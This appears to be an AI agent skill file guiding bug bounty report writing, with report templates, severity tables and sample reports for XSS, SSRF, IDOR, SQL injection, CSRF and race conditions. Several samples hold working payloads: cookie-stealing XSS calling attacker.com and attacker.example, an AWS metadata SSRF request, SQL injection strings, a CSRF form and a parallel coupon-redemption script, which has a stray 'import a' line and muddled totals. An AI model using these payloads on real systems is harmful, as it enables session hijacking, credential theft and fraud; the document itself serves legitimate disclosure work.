---
name: report-writing
description: Bug bounty report writing guide. Covers report structure, severity justification, impact assessment, clear communication techniques, and program-specific requirements. Use when submitting bug bounty reports, writing vulnerability disclosures, or communicating security findings to development teams. Chinese trigger: 报告撰写、report、报告、漏洞报告、bounty report、writeup
---

# Skill: Report Writing

Bug bounty report writing and vulnerability disclosure.

---

## REPORT WRITING PHILOSOPHY

```
REPORT LIFECYCLE:
1. TITLE — Clear, specific vulnerability description
2. SUMMARY — One-paragraph overview
3. STEPS — Numbered reproduction steps
4. PROOF — Evidence (screenshots, Burp, PoC)
5. IMPACT — Real-world consequences
6. REMEDIATION — How to fix
7. REFERENCES — OWASP, CWE, CVEs
```

### Report Writing Rules

```
DO:
+ Be clear and direct
+ Use proper vulnerability terminology (CWE, OWASP)
+ Show attack path step-by-step
+ Include before/after proof
+ Quantify impact (users affected, data at risk)
+ Provide fix code examples
+ Reference CVEs/writeups for credibility
+ Mention tools used (Burp, nuclei)

DON'T:
- Write opinion-based findings (no impact = no bounty)
- Submit self-XSS without CSRF chain
- Include "missing security headers" without real impact
- Submit duplicates without checking existing reports
- Threaten public disclosure
- Demand specific bounty amounts
- Write 5+ page essays (keep it concise)
- Use ambiguous language ("might", "possibly")
```

---

## REPORT STRUCTURE

### Template 1: Standard HackerOne Report

```markdown
# [Vulnerability Type] in [Target Component]

## Summary

[1-2 paragraph overview]
- Vulnerability class: [XSS/SSRF/IDOR/etc.]
- Affected endpoint: [URL]
- Severity: [High/Medium/Low]
- Impact: [Brief description]

## Steps to Reproduce

1. Login to target application: https://target.com/login
2. Navigate to [feature]: https://target.com/feature
3. Send the following request:

```http
POST /api/endpoint HTTP/1.1
Host: target.com
Authorization: Bearer TOKEN
Content-Type: application/json

{
  "param": "MODIFIED_VALUE"
}
```

4. Observe response: [describe what you see]
5. Verify impact: [describe what attacker can do]

## Proof of Concept

[Screenshot of Burp request/response]
[Screenshot of impact demonstration]
[Code snippet if relevant]

## Impact

- [List what attacker can do]
- [Number of affected users, if known]
- [Data at risk]
- [Worst-case scenario if unpatched]

## Remediation

1. [Specific fix #1]
   ```code
   // Before (vulnerable)
   $userId = $_GET['id'];
   $query = "SELECT * FROM users WHERE id = $userId";

   // After (fixed)
   $userId = (int)$_GET['id'];
   $query = "SELECT * FROM users WHERE id = ?";
   $stmt = $pdo->prepare($query);
   $stmt->execute([$userId]);
   ```

2. [Additional defense-in-depth recommendations]

## References

- [OWASP Link](https://owasp.org/)
- [CWE-123](https://cwe.mitre.org/data/definitions/123.html)
- Similar report: [link if available]

---
```

### Template 2: Short Report (for clear bugs)

```markdown
# Stored XSS in Comment Field

## Summary

Stored XSS vulnerability in the comment section at
`/api/comments`. Any user can inject JavaScript that executes
in admin's browser, leading to admin account takeover via
session theft.

Severity: Critical
Endpoint: POST /api/comments

## Steps to Reproduce

1. Login as regular user
2. Send POST to `/api/comments`:

```http
POST /api/comments HTTP/1.1
Content-Type: application/json

{"body": "<img src=x onerror=\"fetch('https://attacker.com/steal?c='+document.cookie)\">"}
```

3. Admin views comments → XSS executes → session stolen

## Proof

[Burp screenshot showing the request and response]

## Impact

Admin session hijacking → full admin access.
Chain: XSS → Cookie Theft → Account Takeover (Critical)

## Fix

Encode user input before storing in database.
Use DOMPurify or similar on output.

## References

- [OWASP XSS](https://owasp.org/www-community/attacks/xss/)
- CWE-79: Cross-site Scripting
```

### Template 3: Chain Report

```markdown
# Chain: IDOR → Password Reset → Account Takeover

## Summary

[Step-by-step description of chain leading to full account takeover]

## Chain Diagram

```
IDOR (/api/users/{id})
  → Change victim's email via IDOR
  → Request password reset for victim account
  → Reset link sent to attacker email
  → Attacker changes victim password
  → Login as victim
  → Full account takeover
```

## Step 1: IDOR on Email Change

[Request and response]

## Step 2: Password Reset (After Email Change)

[Request and response showing reset sent to attacker email]

## Step 3: Account Takeover

[Using reset link, attacker changes password]

## Impact

Full account takeover of any user. Combined severity: Critical.

## Fixes

1. [Fix for step 1]
2. [Fix for step 2]
3. [Fix for step 3]
```

---

## SEVERITY JUSTIFICATION

### Severity Framework

| Severity | CVSS | Impact | Exploitability |
|---------|------|--------|----------------|
| Critical | 9.0-10.0 | RCE, Full DB, Admin ATO | Easy/No auth |
| High | 7.0-8.9 | SSRF, SQLi, ATO, Stored XSS | Moderate |
| Medium | 4.0-6.9 | Reflected XSS, CSRF, IDOR | Hard/Limited |
| Low | 0.1-3.9 | Info disclosure, weak config | Hard |
| N/A | 0.0 | Self-XSS, headers only | - |

### Severity Justification Template

```markdown
## Severity: HIGH
## CVSS: 7.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)
## CWE: CWE-862 (Missing Authorization)

**Justification:**
This vulnerability allows any authenticated user to access
other users' private financial data by modifying the userId
parameter in the API request.

- Affected users: 50,000+ (all registered users with payment methods)
- Data at risk: Last 4 digits of payment cards, billing addresses
- Authentication required: Yes (any user account)
- No user interaction required
- Exploit is trivial (change one number in URL)

**Impact chain:**
IDOR on payment data → Phishing bait → Credential theft

**Reference:** OWASP API Security Top 3 - Broken Object Level Authorization
```

### Severity Upgrade via Chaining

```
Standalone severity    After chain    Reason
──────────────────────────────────────────────────────
Stored XSS (Low/Med)  → Critical      + Session theft → Admin ATO
SSRF DNS-only (Info)  → High           + Internal service access
Open Redirect (Low)   → High           + OAuth code theft → ATO
GraphQL Intro (Med)   → High           + IDOR on node() queries
IDOR PII (Med)        → Critical      + Password reset chain
CSRF non-crit (Low)   → High           + Sensitive action added
Subdomain Takeover (Med) → Critical    + OAuth redirect URI on subdomain
Race single-use (Med) → High           + Unlimited financial gain
```

---

## IMPACT ASSESSMENT

### Impact Description Formats

**Format 1: Bullet Point (concise)**
```
Impact:
• Any authenticated user can access other users' private data
• Affects 50,000+ users
• Exposes: names, emails, phone numbers, addresses
• PII exposure violates GDPR (potential regulatory fines)
• Basis for targeted phishing attacks
```

**Format 2: Narrative (detailed)**
```
The vulnerability allows an attacker to:
1. Enumerate all users by iterating through sequential IDs
2. View each user's full profile including PII
3. Combine with SSRF to escalate to full system access

Worst-case scenario:
Attacker could harvest all 50,000 user records including
full names, email addresses, phone numbers, billing addresses,
and partial payment card data. This enables:
- Mass phishing campaigns
- Identity theft
- Financial fraud
- GDPR reportable breach
```

**Format 3: Chain Impact**
```
Impact Chain:
1. IDOR on /api/users/{id} → View any user's data
2. IDOR on /api/payment-methods/{id} → View payment card tokens
3. IDOR on /api/orders/{id} → View order history
4. Combine all data → Complete user profile reconstruction
5. Use PII for targeted attacks

Total affected records: 50,000+
Sensitivity: High (PII + financial tokens)
Compliance impact: GDPR/PCI-DSS violation
```

### Quantifying Impact

```
User count sources:
- API user enumeration endpoint
- Company press releases / investor docs
- SimilarWeb / Alexa rankings
- SEC filings (for public companies)
- API response sizes (estimate from batch endpoint)
- Error messages that leak total records

Data sensitivity:
Public data (name, public profile) → Low
Sensitive data (email, phone) → Medium
Internal data (employee info) → High
Financial data (payment info) → Critical
Credentials (passwords, tokens) → Critical
Health data → Critical (HIPAA violation)
```

---

## COMMON MISTAKES

### Mistake 1: Weak Descriptions

```
BAD:
"I can access other users' data."
"This is an IDOR vulnerability."
"The parameter is vulnerable."

GOOD:
"By changing userId from 1 to 2 in the PUT request, I can
update any user's profile information, including email and
role. This gives an attacker ability to escalate privileges
by setting their own role to admin."
```

### Mistake 2: No Impact Statement

```
BAD:
"Found SQL injection in the search parameter."
No further explanation.
Program asks: "What's the impact?"

GOOD:
"SQL injection in /api/search?q= parameter allows extracting
the entire users table including usernames and hashed passwords.
Using boolean-blind extraction, I demonstrated extracting the
admin hash. With offline cracking, this leads to admin ATO."
```

### Mistake 3: Missing Fix Guidance

```
BAD:
"There's an IDOR. Fix it."
No code provided.

GOOD:
"Verify resource ownership before returning data:

// Current (vulnerable):
const user = await db.query(`SELECT * FROM users WHERE id = ?`, [req.params.id]);

// Fixed:
const user = await db.query(`SELECT * FROM users WHERE id = ?`, [req.user.id]);

Additionally, implement object-level authorization middleware."
```

### Mistake 4: Submitting Self-XSS

```
BAD:
Submitting stored XSS in own profile without demonstrating
cross-user impact. Programs almost always reject this.

GOOD:
Demonstrate:
1. XSS in profile field
2. Proof that admin's browser executes it (show request)
3. OR combine with CSRF to auto-trigger on victim
```

### Mistake 5: Too Verbose

```
BAD:
"I started by looking at the application and I noticed that
when I logged in I got a token. Then I looked at the API and
found that the user endpoint accepts a user ID parameter. So
I changed it and it gave me someone else's data... [500 more words]"

GOOD:
# IDOR in /api/users/{id} endpoint

Any authenticated user can access other users' full profile
data by modifying the userId parameter.

Steps:
1. POST /api/login → receive access token
2. GET /api/users/123 → returns own profile
3. GET /api/users/124 → returns OTHER user's profile
```

---

## REPORT EXAMPLES BY VULN CLASS

### XSS Report

```markdown
# Stored XSS in Comment Section

Affected: POST /api/comments
Severity: HIGH (when chained with admin access)

Description:
The application stores user-supplied content in the comments
section without sanitization. When admin views the comment,
JavaScript executes in admin's context.

Steps:
1. Login as test user
2. POST /api/comments with body:
   {"postId": 1, "text": "<img src=x onerror=\"fetch('https://attacker.example/steal?c='+document.cookie)\">"}
3. Have admin view the post
4. Admin's session cookie sent to attacker server

Impact:
Session hijacking of admin accounts → full admin access.

Fix:
Sanitize HTML input using DOMPurify before storing.
Apply Content-Security-Policy to restrict script execution.

References:
OWASP XSS: https://owasp.org/www-community/attacks/xss/
CWE-79: https://cwe.mitre.org/data/definitions/79.html
```

### SSRF Report

```markdown
# SSRF on PDF Preview Feature

Affected: POST /api/generate-preview
Severity: CRITICAL

Description:
The PDF preview endpoint accepts a URL parameter and fetches
the content server-side without validation. This allows
access to internal services including AWS metadata.

Steps:
1. Send POST to /api/generate-preview:
   {"url": "http://169.254.169.254/latest/meta-data/"}
2. Response contains AWS IAM role and credentials
3. Use extracted credentials to access S3, Lambda, etc.

Proof:
[Burp request/response showing AWS credentials]

Impact:
Full AWS account access. Can read all S3 buckets, execute
Lambda functions, and pivot to other cloud resources.

Fix:
Whitelist allowed domains for preview feature.
Block access to 169.254.169.254, localhost, and internal IPs.

References:
OWASP SSRF: https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
```

### IDOR Report

```markdown
# IDOR in User Profile Endpoint

Affected: GET /api/profile/{id}
Severity: HIGH

Description:
Changing the user ID in the profile endpoint returns other
users' full personal information including email, phone,
and address.

Steps:
1. Login as user ID 1
2. GET /api/profile/1 → returns own data
3. GET /api/profile/2 → returns DIFFERENT user's data

Proof:
[Two Burp requests side by side showing different responses]

Impact:
- Exposes PII of all users (50,000+)
- Allows user enumeration
- Basis for targeted attacks

Fix:
Verify authenticated user matches requested resource:
SELECT * FROM profiles WHERE user_id = ? AND id = ?
(using req.user.id, not req.params.id)

References:
OWASP BOLA: https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/
CWE-639: Authorization Bypass Through User-Controlled Key
```

### SQLi Report

```markdown
# Time-Based Blind SQL Injection in Search

Affected: GET /api/search?q=
Severity: HIGH

Description:
The search parameter is vulnerable to time-based blind SQL
injection using SLEEP() function.

Steps:
1. Normal query:
   GET /api/search?q=test → responds in 50ms

2. Time-based injection:
   GET /api/search?q=test' AND SLEEP(5)--
   → responds in 5000ms (500ms base + 5000ms delay)

3. Boolean confirmation:
   GET /api/search?q=test' AND 1=1-- → normal response
   GET /api/search?q=test' AND 1=2-- → different response

Proof:
[Timing comparison screenshots]

Impact:
Can extract entire database including user credentials.
Database is MySQL 8.0 based on error messages.

Fix:
Use parameterized queries:
$stmt = $pdo->prepare("SELECT * FROM items WHERE name LIKE ?");
$stmt->execute(["%$search%"]);

References:
OWASP SQLi: https://owasp.org/www-community/attacks/SQL_Injection
CWE-89: Improper Neutralization of Special Elements
```

### CSRF Report

```markdown
# CSRF on Email Change Endpoint

Affected: POST /api/account/email
Severity: HIGH

Description:
The email change endpoint lacks CSRF token validation.
An attacker can change a user's email by directing them
to a malicious page.

Steps:
1. Login to target.com (keep session)
2. Visit attacker.com/csrf.html
3. Page auto-submits form to target.com:
   POST /api/account/email {"newEmail": "attacker@evil.com"}
4. User's email changed without their knowledge

PoC:
```html
<form action="https://target.com/api/account/email" method="POST">
  <input name="newEmail" value="attacker@evil.com">
</form>
<script>document.forms[0].submit()</script>
```

Impact:
Attacker can change victim's email, then use password
reset to gain full account access.

Fix:
Add CSRF token validation:
- Verify X-CSRF-Token header matches session token
- Set SameSite=Strict on auth cookies
```

### Race Condition Report

```markdown
# Race Condition: Duplicate Coupon Redemption

Affected: POST /api/cart/coupon
Severity: HIGH

Description:
The coupon redemption endpoint applies single-use coupons
multiple times when requests are sent in parallel. HTTP/2
multiplexing allows sending multiple requests simultaneously.

Steps:
1. Add item to cart (total: $100)
2. Send 100 parallel requests: {"coupon": "ONETIME50"}
3. Observe: Coupon applied 5 times before race fails
4. Final total: $0.00 (50% discount × 5 = 250%)
5. Cart shows: $0.00 + $100 = $0.00 (negative remaining)

Proof:
[Video showing 100 parallel requests and resulting $0.00 total]

Proof of Concept Script:
```python
import a

import asyncio, aiohttp

async def redeem(session):
    async with session.post(
        "https://target.com/api/cart/coupon",
        json={"coupon": "ONETIME50"}
    ) as r:
        return await r.json()

async def main():
    async with aiohttp.ClientSession(cookies={"session": "TOKEN"}) as s:
        tasks = [redeem(s) for _ in range(100)]
        results = await asyncio.gather(*tasks)
        successes = sum(1 for r in results if r.get('success'))
        print(f"Successful redemptions: {successes}")

asyncio.run(main())
```

Impact:
Financial loss: Unlimited coupon application allows
purchasing products for free or at significant discounts.

Fix:
Implement atomic check-and-apply at database level:
- Use database transactions with row-level locks
- Check coupon usage WITHIN the same transaction
- Add idempotency keys to prevent duplicate processing
```

---

## REPORT NEGOTIATION

### Responding to Program Feedback

```
Program says "Need more impact information":
+ Quantify: "XX users affected"
+ Add compliance context: "GDPR/PCI-DSS"
+ Describe worst case: "Full database dump possible"
+ Reference similar reports in their program

Program says "This is duplicate":
+ Check their disclosed reports first
+ If truly different, explain the difference
+ If same vuln but different chain, resubmit with chain focus

Program says "Please provide PoC":
+ Include full Burp request/response
+ Include step-by-step reproduction
+ Include screenshots or video
+ If chain, include all steps

Program says "Informational" or "N/A":
+ If truly informational, accept and move on
+ Don't argue; build better finding next time
```

### Getting Higher Bounties

```
1. Report chains, not single bugs
2. Show worst-case impact clearly
3. Provide working PoC (not just description)
4. Include remediation code
5. Reference CVEs and OWASP
6. Be professional, not demanding
7. Follow up updates to retest after fix
```

---

## FINAL REPORT RULES

1. **Write the title first** — clear, specific, no ambiguity
2. **One vulnerability per report** — unless chained
3. **Minimal but sufficient PoC** — include what proves impact
4. **Impact over description** — why it matters matters most
5. **Fix over blame** — remediation shows expertise
6. **Reference standards** — OWASP, CWE add credibility
7. **Proof over theory** — real request/response, not speculation
8. **Chain when possible** — 5-10x payout with chains
9. **Professional tone** — bug bounty is a business transaction
10. **Learn from rejections** — understand why, improve next report
